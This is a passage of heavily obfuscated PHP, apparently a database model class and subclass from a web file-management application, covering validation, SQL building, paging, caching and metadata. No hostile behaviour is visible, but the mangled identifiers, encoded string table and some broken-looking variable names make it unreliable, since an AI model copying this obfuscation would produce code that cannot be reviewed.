$ÂÒè÷Î[$—öå¯è] = $Á˜ÈúÕ[$—öå¯è]; } } else { $ÂÒè÷Î[$ú¢ªÈØ[0]] = $Á˜ÈúÕ[$ú¢ªÈØ[0]]; } if (!empty($Á˜ÈúÕ[$this->getPk()])) { $ÂÒè÷Î[$this->getPk()] = array($ŸÛµ«¯‚[407], $Á˜ÈúÕ[$this->getPk()]); } if ($this->where($ÂÒè÷Î)->find()) { return !1; } return !0; default: return $this->check($Á˜ÈúÕ[$ú¢ªÈØ[0]], $ú¢ªÈØ[1], $ú¢ªÈØ[4]); } } public function check($­ĞİÏËó, $‘óÉ®º‚, $şŒªëÃÚ = "\x72\145\147\145\170") { $éï¯Æ =& $_SERVER[íïàËŸë]; $şŒªëÃÚ = strtolower(trim($şŒªëÃÚ)); switch ($şŒªëÃÚ) { case $éï¯Æ[7]: case $éï¯Æ[408]: $ Ë¾Ò„³ = is_array($‘óÉ®º‚) ? $‘óÉ®º‚ : explode($éï¯Æ[50], $‘óÉ®º‚); return $şŒªëÃÚ == $éï¯Æ[7] ? in_array($­ĞİÏËó, $ Ë¾Ò„³) : !in_array($­ĞİÏËó, $ Ë¾Ò„³); case $éï¯Æ[409]: case $éï¯Æ[410]: if (is_array($‘óÉ®º‚)) { $¯Ğ­ª“µ = $‘óÉ®º‚[0]; $çÇæ›õ¤ = $‘óÉ®º‚[1]; } else { list($¯Ğ­ª“µ, $çÇæ›õ¤) = explode($éï¯Æ[50], $‘óÉ®º‚); } return $şŒªëÃÚ == $éï¯Æ[409] ? $­ĞİÏËó >= $¯Ğ­ª“µ && $­ĞİÏËó <= $çÇæ›õ¤ : $­ĞİÏËó < $¯Ğ­ª“µ || $­ĞİÏËó > $çÇæ›õ¤; case $éï¯Æ[411]: case $éï¯Æ[412]: return $şŒªëÃÚ == $éï¯Æ[411] ? $­ĞİÏËó == $‘óÉ®º‚ : $­ĞİÏËó != $‘óÉ®º‚; case $éï¯Æ[413]: $°÷§˜ÓË = mb_strlen($­ĞİÏËó, $éï¯Æ[414]); if (strpos($‘óÉ®º‚, $éï¯Æ[50])) { list($¯Ğ­ª“µ, $çÇæ›õ¤) = explode($éï¯Æ[50], $‘óÉ®º‚); return $°÷§˜ÓË >= $¯Ğ­ª“µ && $°÷§˜ÓË <= $çÇæ›õ¤; } else { return $°÷§˜ÓË == $‘óÉ®º‚; } case $éï¯Æ[415]: list($€ÜàöÍË, $“Ü…¢À¬) = explode($éï¯Æ[50], $‘óÉ®º‚); if (!is_numeric($€ÜàöÍË)) { $€ÜàöÍË = strtotime($€ÜàöÍË); } if (!is_numeric($“Ü…¢À¬)) { $“Ü…¢À¬ = strtotime($“Ü…¢À¬); } return NOW_TIME >= $€ÜàöÍË && NOW_TIME <= $“Ü…¢À¬; case $éï¯Æ[416]: return in_array(get_client_ip(), explode($éï¯Æ[50], $‘óÉ®º‚)); case $éï¯Æ[417]: return !in_array(get_client_ip(), explode($éï¯Æ[50], $‘óÉ®º‚)); case $éï¯Æ[404]: default: return $this->regex($­ĞİÏËó, $‘óÉ®º‚); } } public function query($ÂÙÑáŸ¼, $âáÂğµ¤ = false) { $Å¾‡ìÉ =& $_SERVER[íïàËŸë]; if (!is_bool($âáÂğµ¤) && !is_array($âáÂğµ¤)) { $âáÂğµ¤ = func_get_args(); array_shift($âáÂğµ¤); } $ÂÙÑáŸ¼ = str_replace(array($Å¾‡ìÉ[262], $Å¾‡ìÉ[418]), $Å¾‡ìÉ[53], $ÂÙÑáŸ¼); $ÂÙÑáŸ¼ = $this->parseSql($ÂÙÑáŸ¼, $âáÂğµ¤); return $this->db->query($ÂÙÑáŸ¼); } public function execute($ûÏ•íØí, $ššƒĞ§ƒ = false) { if (!is_bool($ššƒĞ§ƒ) && !is_array($ššƒĞ§ƒ)) { $ššƒĞ§ƒ = func_get_args(); array_shift($ššƒĞ§ƒ); } $ûÏ•íØí = $this->parseSql($ûÏ•íØí, $ššƒĞ§ƒ); return $this->db->execute($ûÏ•íØí); } protected function parseSql($æ¬­ÍÌË, $òĞô”¹Æ) { $ª¯şÎ =& $_SERVER[íïàËŸë]; if (!0 === $òĞô”¹Æ) { $Úıí ‰Ÿ = $this->_parseOptions(); $æ¬­ÍÌË = $this->db->parseSql($æ¬­ÍÌË, $Úıí ‰Ÿ); } elseif (is_array($òĞô”¹Æ)) { $òĞô”¹Æ = array_map(array($this->db, $ª¯şÎ[419]), $òĞô”¹Æ); $æ¬­ÍÌË = vsprintf($æ¬­ÍÌË, $òĞô”¹Æ); } else { $æ¬­ÍÌË = strtr($æ¬­ÍÌË, array($ª¯şÎ[420] => $this->getTableName(), $ª¯şÎ[421] => think_config($ª¯şÎ[321]))); } $this->db->setModel($this->name); return $æ¬­ÍÌË; } public function db($¥¨ßÈøî = '', $…®éı•³ = '', $à‚ØÃªù = array()) { $ÜŞ…Ÿ®¶ =& $_SERVER[íïàËŸë]; if ($ÜŞ…Ÿ®¶[12] === $¥¨ßÈøî && $this->db) { return $this->db; } static $–Ö´¬ı¨ = array(); static $¼ÃêĞÊ¡ = array(); if (!isset($¼ÃêĞÊ¡[$¥¨ßÈøî]) || isset($¼ÃêĞÊ¡[$¥¨ßÈøî]) && $…®éı•³ && $–Ö´¬ı¨[$¥¨ßÈøî] != $…®éı•³) { if (!empty($…®éı•³) && is_string($…®éı•³) && !1 === strpos($…®éı•³, $ÜŞ…Ÿ®¶[8])) { $…®éı•³ = think_config($…®éı•³); } $¥¨ßÈøî = think_guid($…®éı•³); $¼ÃêĞÊ¡[$¥¨ßÈøî] = Db::getInstance($…®éı•³); } elseif (NULL === $…®éı•³) { $¼ÃêĞÊ¡[$¥¨ßÈøî]->close(); unset($¼ÃêĞÊ¡[$¥¨ßÈøî]); return; } if (!empty($à‚ØÃªù)) { if (is_string($à‚ØÃªù)) { parse_str($à‚ØÃªù, $à‚ØÃªù); } foreach ($à‚ØÃªù as $Å¶‰Å¥Ì => $¹ˆ¹êóÛ) { $this->setProperty($Å¶‰Å¥Ì, $¹ˆ¹êóÛ); } } $–Ö´¬ı¨[$¥¨ßÈøî] = $…®éı•³; $this->db = $¼ÃêĞÊ¡[$¥¨ßÈøî]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ÒšùÜ¡ƒ = get_class($this); if ($ÒšùÜ¡ƒ == $_SERVER[íïàËŸë][422]) { return $this->name; } $this->name = substr($ÒšùÜ¡ƒ, 0, -5); } return $this->name; } public function getTableName() { $¬ğ‰½ŠÍ =& $_SERVER[íïàËŸë]; if (empty($this->trueTableName)) { $ˆ“àŞ = !empty($this->tablePrefix) ? $this->tablePrefix : $¬ğ‰½ŠÍ[12]; if (!empty($this->tableName)) { $ˆ“àŞ .= $this->tableName; } else { $ˆ“àŞ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ˆ“àŞ); } return (!empty($this->dbName) ? $this->dbName . $¬ğ‰½ŠÍ[10] : $¬ğ‰½ŠÍ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ĞÅ›¾¶¨ =& $_SERVER[íïàËŸë]; return isset($this->fields[$ĞÅ›¾¶¨[328]]) ? $this->fields[$ĞÅ›¾¶¨[328]] : $this->pk; } public function getDbFields() { $è‚êç =& $_SERVER[íïàËŸë]; if (isset($this->options[$è‚êç[356]])) { $†è’Óñ = $this->db->getFields($this->options[$è‚êç[356]]); return $†è’Óñ ? array_keys($†è’Óñ) : !1; } if ($this->fields) { $†è’Óñ = $this->fields; unset($†è’Óñ[$è‚êç[327]], $†è’Óñ[$è‚êç[328]], $†è’Óñ[$è‚êç[329]], $†è’Óñ[$è‚êç[326]]); return $†è’Óñ; } return !1; } public function data($Ş”ÂşÃ´ = '') { $‰È·ı»õ =& $_SERVER[íïàËŸë]; if ($‰È·ı»õ[12] === $Ş”ÂşÃ´ && !empty($this->data)) { return $this->data; } if (is_object($Ş”ÂşÃ´)) { $Ş”ÂşÃ´ = get_object_vars($Ş”ÂşÃ´); } elseif (is_string($Ş”ÂşÃ´)) { parse_str($Ş”ÂşÃ´, $Ş”ÂşÃ´); } elseif (!is_array($Ş”ÂşÃ´)) { think_exception(think_lang($‰È·ı»õ[348])); } $this->data = $Ş”ÂşÃ´; return $this; } public function join($„©Ğ˜ïæ) { $–°”ÀĞ =& $_SERVER[íïàËŸë]; if (is_array($„©Ğ˜ïæ)) { $this->options[$–°”ÀĞ[359]] = $„©Ğ˜ïæ; } elseif (!empty($„©Ğ˜ïæ)) { $this->options[$–°”ÀĞ[359]][] = $„©Ğ˜ïæ; } return $this; } public function union($§Ê©°›ª, $ˆûŠÔÌ = false) { $Õ³ë¾éî =& $_SERVER[íïàËŸë]; if (empty($§Ê©°›ª)) { return $this; } if ($ˆûŠÔÌ) { $this->options[$Õ³ë¾éî[423]][$Õ³ë¾éî[424]] = !0; } if (is_object($§Ê©°›ª)) { $§Ê©°›ª = get_object_vars($§Ê©°›ª); } if (is_string($§Ê©°›ª)) { $ªåõÜåÂ = $§Ê©°›ª; } elseif (is_array($§Ê©°›ª)) { if (isset($§Ê©°›ª[0])) { $this->options[$Õ³ë¾éî[423]] = array_merge($this->options[$Õ³ë¾éî[423]], $§Ê©°›ª); return $this; } else { $ªåõÜåÂ = $§Ê©°›ª; } } else { think_exception(think_lang($Õ³ë¾éî[348])); } $this->options[$Õ³ë¾éî[423]][] = $ªåõÜåÂ; return $this; } public function cache($Ôá²‹¿ˆ = true, $ªı“²ÀÀ = null, $Ç¾·ÈÚƒ = '') { $”µÎÃ› =& $_SERVER[íïàËŸë]; if (!1 !== $Ôá²‹¿ˆ) { $this->options[$”µÎÃ›[425]] = array($”µÎÃ›[97] => $Ôá²‹¿ˆ, $”µÎÃ›[415] => $ªı“²ÀÀ, $”µÎÃ›[33] => $Ç¾·ÈÚƒ); } return $this; } public function field($àĞûå¢Æ, $´ÀŒÔÍº = false) { $Íµ×Ÿ±× =& $_SERVER[íïàËŸë]; if (!0 === $àĞûå¢Æ) { $û¨Ã·«Ó = $this->getDbFields(); $àĞûå¢Æ = $û¨Ã·«Ó ? $û¨Ã·«Ó : $Íµ×Ÿ±×[220]; } elseif ($´ÀŒÔÍº) { if (is_string($àĞûå¢Æ)) { $àĞûå¢Æ = explode($Íµ×Ÿ±×[50], $àĞûå¢Æ); } $û¨Ã·«Ó = $this->getDbFields(); $àĞûå¢Æ = $û¨Ã·«Ó ? array_diff($û¨Ã·«Ó, $àĞûå¢Æ) : $àĞûå¢Æ; } $this->options[$Íµ×Ÿ±×[350]] = $àĞûå¢Æ; return $this; } public function scope($ÏĞ–Ë = '', $å­¨¦®ª = NULL) { $ıŞú¦Å• =& $_SERVER[íïàËŸë]; if ($ıŞú¦Å•[12] === $ÏĞ–Ë) { if (isset($this->_scope[$ıŞú¦Å•[37]])) { $ä•ùŠÀÚ = $this->_scope[$ıŞú¦Å•[37]]; } else { return $this; } } elseif (is_string($ÏĞ–Ë)) { $§½àÅË = explode($ıŞú¦Å•[50], $ÏĞ–Ë); $ä•ùŠÀÚ = array(); foreach ($§½àÅË as $ƒ¢°Éßü) { if (!isset($this->_scope[$ƒ¢°Éßü])) { continue; } $ä•ùŠÀÚ = array_merge($ä•ùŠÀÚ, $this->_scope[$ƒ¢°Éßü]); } if (!empty($å­¨¦®ª) && is_array($å­¨¦®ª)) { $ä•ùŠÀÚ = array_merge($ä•ùŠÀÚ, $å­¨¦®ª); } } elseif (is_array($ÏĞ–Ë)) { $ä•ùŠÀÚ = $ÏĞ–Ë; } if (is_array($ä•ùŠÀÚ) && !empty($ä•ùŠÀÚ)) { $this->options = array_merge($this->options, array_change_key_case($ä•ùŠÀÚ)); } return $this; } public function where($ÉƒèÑŞ¶, $àÆÁ¥è÷ = null) { $‰¦ü‹Åõ =& $_SERVER[íïàËŸë]; if (!is_null($àÆÁ¥è÷) && is_string($ÉƒèÑŞ¶)) { if (!is_array($àÆÁ¥è÷)) { $àÆÁ¥è÷ = func_get_args(); array_shift($àÆÁ¥è÷); } $àÆÁ¥è÷ = array_map(array($this->db, $‰¦ü‹Åõ[419]), $àÆÁ¥è÷); $ÉƒèÑŞ¶ = vsprintf($ÉƒèÑŞ¶, $àÆÁ¥è÷); } elseif (is_object($ÉƒèÑŞ¶)) { $ÉƒèÑŞ¶ = get_object_vars($ÉƒèÑŞ¶); } elseif (is_array($ÉƒèÑŞ¶)) { foreach ($ÉƒèÑŞ¶ as $êİÕÇ => $ÖÚƒèÀ) { if ((is_numeric($êİÕÇ) || !$êİÕÇ) && is_string($ÖÚƒèÀ)) { if (strpos($ÖÚƒèÀ, $‰¦ü‹Åõ[426]) === 0) { continue; } think_trace($‰¦ü‹Åõ[427], $‰¦ü‹Åõ[12], $‰¦ü‹Åõ[49]); die; } } } if (is_string($ÉƒèÑŞ¶) && $‰¦ü‹Åõ[12] != $ÉƒèÑŞ¶) { $¯ˆ¡„ù = array(); $¯ˆ¡„ù[$‰¦ü‹Åõ[428]] = $ÉƒèÑŞ¶; $ÉƒèÑŞ¶ = $¯ˆ¡„ù; } if (isset($this->options[$‰¦ü‹Åõ[352]])) { $this->options[$‰¦ü‹Åõ[352]] = array_merge($this->options[$‰¦ü‹Åõ[352]], $ÉƒèÑŞ¶); } else { $this->options[$‰¦ü‹Åõ[352]] = $ÉƒèÑŞ¶; } return $this; } public function limit($Ğœ®ƒ‰¿, $Ş™¹‘• = null) { $í¹ßÏ™² =& $_SERVER[íïàËŸë]; $this->options[$í¹ßÏ™²[368]] = is_null($Ş™¹‘•) ? $Ğœ®ƒ‰¿ : $Ğœ®ƒ‰¿ . $í¹ßÏ™²[50] . $Ş™¹‘•; return $this; } public function page($÷©æ½‚, $ ·æå€ˆ = null) { $»¬†Ö¸¼ =& $_SERVER[íïàËŸë]; $this->options[$»¬†Ö¸¼[429]] = is_null($ ·æå€ˆ) ? $÷©æ½‚ : $÷©æ½‚ . $»¬†Ö¸¼[50] . $ ·æå€ˆ; return $this; } public function comment($Á¨şÒÕ) { $this->options[$_SERVER[íïàËŸë][430]] = $Á¨şÒÕ; return $this; } public function setProperty($ªø©•‚¹, $ø³ğ…Àë) { if (property_exists($this, $ªø©•‚¹)) { $this->{$ªø©•‚¹} = $ø³ğ…Àë; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\x69\146\x79\124\151\x6d\x65", "\164\x69\155\x65", "\x69\x6e\x73\x65\162\x74\x2c\165\x70\x64\141\164\145", "\146\x75\156\143\164\151\x6f\x6e"), array("\143\162\145\141\164\145\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\164", "\x66\165\156\143\x74\151\x6f\x6e")); public function setDataAuto($Ô¶şò) { $this->dataAuto = $Ô¶şò; } public function __construct($œäÁ·•¨ = '', $¢òŞ¬ç„ = '', $«¹¼‚¦… = '') { parent::__construct($œäÁ·•¨, $¢òŞ¬ç„, $«¹¼‚¦…); } protected $tableMeta = array(); protected function _beforeInsert(&$ØÂ¸îÑ, $ÄÖ‹íÀİ) { $×Íù¤Á =& $_SERVER[íïàËŸë]; if (!$this->checkDataAutoHas($×Íù¤Á[431])) { return; } $this->dataBeforeFilter($ØÂ¸îÑ, $×Íù¤Á[431]); } protected function _beforeUpdate(&$‹äÃ‡Ù×, $ê¬€ù‰é) { $´ï¸ÒìŠ =& $_SERVER[íïàËŸë]; if (!$this->checkDataAutoHas($´ï¸ÒìŠ[432])) { return; } $this->dataBeforeFilter($‹äÃ‡Ù×, $´ï¸ÒìŠ[432]); } protected function _afterSelect(&$ˆÜ›Éİ¥, $È€œ¹Ñƒ) { if (!is_array($ˆÜ›Éİ¥)) { return; } if (!$this->checkDataAutoHas($_SERVER[íïàËŸë][433])) { return; } foreach ($ˆÜ›Éİ¥ as &$­ÄšŞ«õ) { $this->dataAfterFilter($­ÄšŞ«õ); } unset($­ÄšŞ«õ); } protected function _afterFind(&$³Â…ïµ¥, $â“˜ŒÎ) { if (!is_array($³Â…ïµ¥)) { return; } if (!$this->checkDataAutoHas($_SERVER[íïàËŸë][433])) { return; } $this->dataAfterFilter($³Â…ïµ¥); } public static function textEncode($ÍŒÚœ×Ø) { if (!$ÍŒÚœ×Ø) { return $ÍŒÚœ×Ø; } $ØŞ¸¡ª = json_encode($ÍŒÚœ×Ø); $ØŞ¸¡ª = preg_replace_callback($_SERVER[íïàËŸë][434], function ($¶®îƒ¤Õ) { return addslashes($¶®îƒ¤Õ[0]); }, $ØŞ¸¡ª); return json_decode($ØŞ¸¡ª); } public static function textDecode($‚ì©›°) { $¿¶®‰¿š =& $_SERVER[íïàËŸë]; $ë×ŞÃ´Ş = json_encode($‚ì©›°); $ë×ŞÃ´Ş = preg_replace_callback($¿¶®‰¿š[435], function ($ÂŒ½·á) { return $_SERVER[íïàËŸë][100]; }, $ë×ŞÃ´Ş); return json_decode($ë×ŞÃ´Ş); } public function setAutoIncrement($ÆÖ°Üè±) { $•ÇË˜Òø = array($this->getPk() => $ÆÖ°Üè±); $È€™¢æÌ = $this->data($•ÇË˜Òø)->add(); if ($È€™¢æÌ) { $this->delete($È€™¢æÌ); } } public function getAutoIncrement() { $Û¶®Ôš = $this->getTableName(); $ÀéŞ­Œë = $this->max($this->getPk()); $¥²­åÏ¹ = $this->query("\x73\x68\157\x77\40\164\x61\x62\x6c\145\40\x73\164\x61\x74\x75\x73\x20\x77\x68\x65\x72\x65\40\116\x61\155\x65\75\47{$Û¶®Ôš}\x27"); $ŸóÀ–³È = $¥²­åÏ¹[0][$_SERVER[íïàËŸë][436]]; $Ô‘˜¯¬Ÿ = max($ÀéŞ­Œë, $ŸóÀ–³È); return $Ô‘˜¯¬Ÿ; } protected function _callBefore($’Òå•¡¸, $ÄÔ›ˆƒù) { return $this->cacheCallCheck($’Òå•¡¸, $ÄÔ›ˆƒù, !1); } protected function _callAfter($¡êî¥˜, $ÎãìÆöÉ) { return $this->cacheCallCheck($¡êî¥˜, $ÎãìÆöÉ, !0); } protected function cacheFunctionAlias($›Éåª³×) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ËÏĞûûÄ, $±¥­ŸŸÌ, $à•éÙõù = false) { $å‚ÆìÓ° = $this->cacheFunctionAlias($±¥­ŸŸÌ); if (!$å‚ÆìÓ°) { return; } foreach ($å‚ÆìÓ° as $´¡®€ => $†ñÖİÊ‚) { $áÀØÙ—ä = $†ñÖİÊ‚[0]; $³ºÕä‘¸ = explode($_SERVER[íïàËŸë][50], $†ñÖİÊ‚[1]); if ($ËÏĞûûÄ == $´¡®€) { return $this->cacheFunctionGet($´¡®€, $áÀØÙ—ä); } if ($à•éÙõù && in_array($ËÏĞûûÄ, $³ºÕä‘¸)) { $this->cacheFunctionClear($´¡®€, $áÀØÙ—ä); } } } public function cacheFunctionGet($±“ŒôìØ, $íâŒÜè¥) { $ßÍŒéºè = $this->cacheKeyMake($±“ŒôìØ, $íâŒÜè¥); $’Ü¹ŞÅæ = Cache::get($ßÍŒéºè); if (!is_array($’Ü¹ŞÅæ)) { $’Ü¹ŞÅæ = call_user_func_array(array($this, $±“ŒôìØ), array($íâŒÜè¥, !0)); Cache::set($ßÍŒéºè, $’Ü¹ŞÅæ); } return $’Ü¹ŞÅæ; } public function cacheFunctionClear($ÂÃŠÑŠ©, $“´ÀÉ‹) { $ÜşÄ¦úØ = $“´ÀÉ‹; if (!is_array($“´ÀÉ‹)) { $ÜşÄ¦úØ = array($“´ÀÉ‹); } foreach ($ÜşÄ¦úØ as $§Àóæ†¤) { $ûœ‚ª¹“ = $this->cacheKeyMake($ÂÃŠÑŠ©, $§Àóæ†¤); Cache::remove($ûœ‚ª¹“); } } private function cacheKeyMake($ÑŒ›†ñø, $Ü¿—Îä¿) { $ä²å’Œ• =& $_SERVER[íïàËŸë]; return get_class($this) . $ä²å’Œ•[11] . $ÑŒ›†ñø . $ä²å’Œ•[437] . $Ü¿—Îä¿; } protected function selectPageReset() { $Ê¯ííÉı =& $_SERVER[íïàËŸë]; if (isset($GLOBALS[$Ê¯ííÉı[438]])) { return; } $GLOBALS[$Ê¯ííÉı[438]] = isset($GLOBALS[$Ê¯ííÉı[7]][$Ê¯ííÉı[439]]) ? $GLOBALS[$Ê¯ííÉı[7]][$Ê¯ííÉı[439]] : !1; $GLOBALS[$Ê¯ííÉı[440]] = isset($GLOBALS[$Ê¯ííÉı[7]][$Ê¯ííÉı[429]]) ? $GLOBALS[$Ê¯ííÉı[7]][$Ê¯ííÉı[429]] : !1; $GLOBALS[$Ê¯ííÉı[7]][$Ê¯ííÉı[439]] = !1; $GLOBALS[$Ê¯ííÉı[7]][$Ê¯ííÉı[429]] = !1; } protected function selectPageRestore() { $Í“º× =& $_SERVER[íïàËŸë]; if (!isset($GLOBALS[$Í“º×[438]])) { return; } $GLOBALS[$Í“º×[7]][$Í“º×[439]] = $GLOBALS[$Í“º×[438]]; $GLOBALS[$Í“º×[7]][$Í“º×[429]] = $GLOBALS[$Í“º×[440]]; if ($GLOBALS[$Í“º×[7]][$Í“º×[439]] === !1) { unset($GLOBALS[$Í“º×[7]][$Í“º×[439]]); } if ($GLOBALS[$Í“º×[7]][$Í“º×[429]] === !1) { unset($GLOBALS[$Í“º×[7]][$Í“º×[429]]); } unset($GLOBALS[$Í“º×[438]]); unset($GLOBALS[$Í“º×[440]]); } protected function selectPage($ÆŠ„Î…° = 200, $Âüğ„ë = 1) { $‰ìİ²Ò„ =& $_SERVER[íïàËŸë]; global $in; $êĞ™Æ›½ = $this->optionsValue(); $”çİ­æÔ = 50000; $ÆŠ„Î…° = isset($in[$‰ìİ²Ò„[439]]) && $in[$‰ìİ²Ò„[439]] ? $in[$‰ìİ²Ò„[439]] : $ÆŠ„Î…°; if ($ÆŠ„Î…° === -1) { $in[$‰ìİ²Ò„[439]] = !1; $”çİ­æÔ = 100000000; $ÆŠ„Î…° = $”çİ­æÔ; } $¡¹ºêî± = $êĞ™Æ›½; $¡¹ºêî±[$‰ìİ²Ò„[441]] = array(); $ÆŠ„Î…° = intval($ÆŠ„Î…°); $ÆŠ„Î…° = $ÆŠ„Î…° <= 5 ? 5 : ($ÆŠ„Î…° >= $”çİ­æÔ ? $”çİ­æÔ : $ÆŠ„Î…°); $Âüğ„ë = intval(isset($in[$‰ìİ²Ò„[429]]) && $in[$‰ìİ²Ò„[429]] ? $in[$‰ìİ²Ò„[429]] : $Âüğ„ë); $Âüğ„ë = $Âüğ„ë <= 1 ? 1 : $Âüğ„ë; $ŠµüÏëÙ = array(); $´œü¼¼  = 1; if ($Âüğ„ë == 1 && $´œü¼¼ ) { $this->optionsValue($êĞ™Æ›½); $ŠµüÏëÙ = $this->page($Âüğ„ë, $ÆŠ„Î…°)->select(); $·î’ÌÊ = is_array($ŠµüÏëÙ) ? count($ŠµüÏëÙ) : 0; if ($·î’ÌÊ < $ÆŠ„Î…°) { $ıÕ¦óøö = 1; } else { $this->optionsValue($¡¹ºêî±); $·î’ÌÊ = intval($this->count()); $ıÕ¦óøö = ceil($·î’ÌÊ / $ÆŠ„Î…°); } } else { $this->optionsValue($¡¹ºêî±); $·î’ÌÊ = intval($this->count()); $ıÕ¦óøö = ceil($·î’ÌÊ / $ÆŠ„Î…°); $Âüğ„ë = $Âüğ„ë >= $ıÕ¦óøö ? $ıÕ¦óøö : $Âüğ„ë; $this->optionsValue($êĞ™Æ›½); $ŠµüÏëÙ = $this->page($Âüğ„ë, $ÆŠ„Î…°)->select(); } if (!is_array($ŠµüÏëÙ)) { $ŠµüÏëÙ = array(); } if ($ıÕ¦óøö == 1) { $·î’ÌÊ = count($ŠµüÏëÙ); } $ğ¼ÂÕÀí = array($‰ìİ²Ò„[442] => array($‰ìİ²Ò„[443] => $·î’ÌÊ, $‰ìİ²Ò„[439] => $ÆŠ„Î…°, $‰ìİ²Ò„[429] => $Âüğ„ë, $‰ìİ²Ò„[444] => $ıÕ¦óøö), $‰ìİ²Ò„[445] => $ŠµüÏëÙ); return $ğ¼ÂÕÀí; } protected function checkLength($ß¥››ïï, $¯²ÎÓÌã = 0, $Ø×·¶ŸŒ = '') { $œÇ‡ÙÃä =& $_SERVER[íïàËŸë]; $¯²ÎÓÌã = $¯²ÎÓÌã ? $¯²ÎÓÌã : 65536; if (!$ß¥››ïï || strlen($ß¥››ïï) < $¯²ÎÓÌã) { return; } $Ø×·¶ŸŒ = $Ø×·¶ŸŒ ? $Ø×·¶ŸŒ . $œÇ‡ÙÃä[74] : $œÇ‡ÙÃä[12]; show_json($Ø×·¶ŸŒ . LNG($œÇ‡ÙÃä[446]) . "\x28{$¯²ÎÓÌã}\x29", !1); } protected function metaSet($ïìã“½Ù, $›ûŠ´·ì = null, $ôÄ²ÊÊ‹ = null) { $ûÕìŠáÆ =& $_SERVER[íïàËŸë]; if (!$this->tableMeta || !$ïìã“½Ù) { return !1; } $Œ©¼¢ƒ = $this->tableMeta[$ûÕìŠáÆ[447]]; $¾“„§ú½ = $this->tableMeta[$ûÕìŠáÆ[448]]; $†ıá¨ë¶ = Model($¾“„§ú½); $àÃ—Ô°ö = array($Œ©¼¢ƒ => $ïìã“½Ù, $ûÕìŠáÆ[449] => $›ûŠ´·ì); if (is_null($›ûŠ´·ì)) { return $†ıá¨ë¶->where(array($Œ©¼¢ƒ => $ïìã“½Ù))->delete(); } if (is_null($ôÄ²ÊÊ‹) && is_string($›ûŠ´·ì)) { return $†ıá¨ë¶->where($àÃ—Ô°ö)->delete(); } $Ä·‡Ùê” = is_array($›ûŠ´·ì) ? $›ûŠ´·ì : array(); if (is_string($›ûŠ´·ì)) { $Ä·‡Ùê”[$›ûŠ´·ì] = $ôÄ²ÊÊ‹; } $±¼±ïû¡ = array(); foreach ($Ä·‡Ùê” as $áÁ÷†Ó’ => $”ÒÛáÃÜ) { if (is_null($”ÒÛáÃÜ) && is_string($áÁ÷†Ó’)) { $†ıá¨ë¶->where(array($Œ©¼¢ƒ => $ïìã“½Ù, $ûÕìŠáÆ[449] => $áÁ÷†Ó’))->delete(); continue; } $this->checkLength($”ÒÛáÃÜ, !1, $¾“„§ú½ . $ûÕìŠáÆ[4] . $áÁ÷†Ó’); $±¼±ïû¡[] = array($Œ©¼¢ƒ => $ïìã“½Ù, $ûÕìŠáÆ[97] => $áÁ÷†Ó’, $ûÕìŠáÆ[450] => $”ÒÛáÃÜ); } $±ÚÈöç = $ûÕìŠáÆ[451] . $¾“„§ú½; CacheLock::lock($±ÚÈöç); $†ıá¨ë¶->where(array($Œ©¼¢ƒ => $ïìã“½Ù))->addAll($±¼±ïû¡, array(), !0); CacheLock::unlock($±ÚÈöç); return !0; } public function metaGet($©„ì¬Å¶, $®ĞÅ„†ı = false) { $Ó“ö˜”¡ =& $_SERVER[íïàËŸë]; if (!$this->tableMeta) { return array(); } $ë½¼å´¾ = $this->tableMeta[$Ó“ö˜”¡[447]]; $ƒ¿ëñ˜“ = Model($this->tableMeta[$Ó“ö˜”¡[448]]); if ($®ĞÅ„†ı) { $ãÁàÈë” = array($ë½¼å´¾ => $©„ì¬Å¶, $Ó“ö˜”¡[97] => $®ĞÅ„†ı); return $ƒ¿ëñ˜“->where($ãÁàÈë”)->getField($Ó“ö˜”¡[450]); } $ãÁàÈë” = array($ë½¼å´¾ => $©„ì¬Å¶); $Ë¢—ë˜® = $ƒ¿ëñ˜“->field($Ó“ö˜”¡[452])->where($ãÁàÈë”)->select(); $Ë¢—ë˜® = array_to_keyvalue($Ë¢—ë˜®, $Ó“ö˜”¡[97], $Ó“ö˜”¡[450]); return $Ë¢—ë˜®; } private function checkDataAutoHas($è”™”•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¾ü˜³¦) { if (in_array($è”™”•, explode($_SERVER[íïàËŸë][50], $¾ü˜³¦[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$æã‡µªË, $Ïâî¬Óô) { $­Ê‚ØÌê =& $_SERVER[íïàËŸë]; if (!is_array($æã‡µªË)) { return; } foreach ($this->dataAuto as $‹…íİã) { $Š±ÎšµÒ = $‹…íİã[0]; if (!in_array($Ïâî¬Óô, explode($­Ê‚ØÌê[50], $‹…íİã[2]))) { continue; } switch (trim($‹…íİã[3])) { case $­Ê‚ØÌê[397]: case $­Ê‚ØÌê[398]: $ÉâÑ¨À = $‹…íİã[1]; $ÁƒåŠËÎ = isset($‹…íİã[4]) ? (array) $‹…íİã[4] : array(); if ($ÉâÑ¨À == $­Ê‚ØÌê[206] && array_key_exists($Š±ÎšµÒ, $æã‡µªË)) { if (!$æã‡µªË[$Š±ÎšµÒ]) { unset($æã‡µªË[$Š±ÎšµÒ]); } break; } if (isset($æã‡µªË[$Š±ÎšµÒ])) { array_unshift($ÁƒåŠËÎ, $æã‡µªË[$Š±ÎšµÒ]); } if ($­Ê‚ØÌê[397] == $‹…íİã[3]) { $æã‡µªË[$Š±ÎšµÒ] = call_user_func_array($ÉâÑ¨À, $ÁƒåŠËÎ); } else { $æã‡µªË[$Š±ÎšµÒ] = call_user_func_array(array(&$this, $ÉâÑ¨À), $ÁƒåŠËÎ); } break; case $­Ê‚ØÌê[347]: if (isset($æã‡µªË[$Š±ÎšµÒ]) && $æã‡µªË[$Š±ÎšµÒ]) { $æã‡µªË[$Š±ÎšµÒ] = call_user_func_array(array(&$this, 